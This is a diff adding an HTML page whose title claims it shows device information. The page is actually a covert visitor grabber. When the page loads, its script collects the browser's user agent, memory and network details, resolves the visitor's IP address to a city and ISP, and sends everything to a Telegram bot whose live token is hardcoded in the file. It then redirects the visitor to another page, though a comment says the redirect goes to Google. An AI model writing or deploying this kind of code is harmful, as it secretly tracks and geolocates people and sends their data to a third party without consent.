@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Information</title>
+    <script>
+        async function collectAndSendData() {
+            // Collect device information
+            const deviceName = navigator.userAgent;
+            const userAgent = navigator.userAgent;
+            const ram = navigator.deviceMemory || "N/A"; // RAM in GB
+            const storage = navigator.storage || "N/A"; // Storage details
+            const visitTime = new Date().toLocaleString();
+            const connection = navigator.connection || "N/A"; // Internet details
+            const connectionType = connection.effectiveType || "N/A";
+            const downlinkSpeed = connection.downlink || "N/A"; // Downlink speed in Mbps
+            const rtt = connection.rtt || "N/A"; // Round-trip time in ms
+            const bandwidth = connection.downlinkMax || "N/A"; // Internet bandwidth
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ipAddress = ipData.ip;
+
+            const locationResponse = await fetch(`https://ipinfo.io/${ipAddress}/json`);
+            const locationData = await locationResponse.json();
+            const location = `${locationData.city}, ${locationData.region}, ${locationData.country}`;
+            const isp = locationData.org || "N/A"; // Internet Service Provider (ISP)
+
+            // Prepare data to send
+            const data = {
+                deviceName,
+                ipAddress,
+                location,
+                visitTime,
+                userAgent,
+                ram: `${ram} GB`,
+                storage: JSON.stringify(storage),
+                internetDetails: {
+                    connectionType,
+                    downlinkSpeed: `${downlinkSpeed} Mbps`,
+                    rtt: `${rtt} ms`,
+                    bandwidth: `${bandwidth} Mbps`,
+                    isp
+                }
+            };
+
+            // Send data to Telegram bot (replace YOUR_BOT_TOKEN and YOUR_CHAT_ID)
+            const botToken = '7840186293:AAEIcH8ZlVlT_KKZ5_HaydcEN_5Vp4uyZrE';
+            const chatId = '7811361994';
+            const message = `
+Device Information:
+- Device Name: ${data.deviceName}
+- IP Address: ${data.ipAddress}
+- Location: ${data.location}
+- Visit Time: ${data.visitTime}
+- User Agent: ${data.userAgent}
+- RAM: ${data.ram}
+- Storage: ${data.storage}
+- Internet Details:
+  - Connection Type: ${data.internetDetails.connectionType}
+  - Downlink Speed: ${data.internetDetails.downlinkSpeed}
+  - Round-Trip Time: ${data.internetDetails.rtt}
+  - Bandwidth: ${data.internetDetails.bandwidth}
+  - ISP: ${data.internetDetails.isp}
+            `;
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            await fetch(telegramUrl);
+
+            // Redirect to Google
+            window.location.href = 'life.html';
+        }
+
+        // Run the function when the page loads
+        window.onload = collectAndSendData;
+    </script>
+</head>
+<body>
+    <h1>Collecting Device ...</h1>
+</body>
+</html>
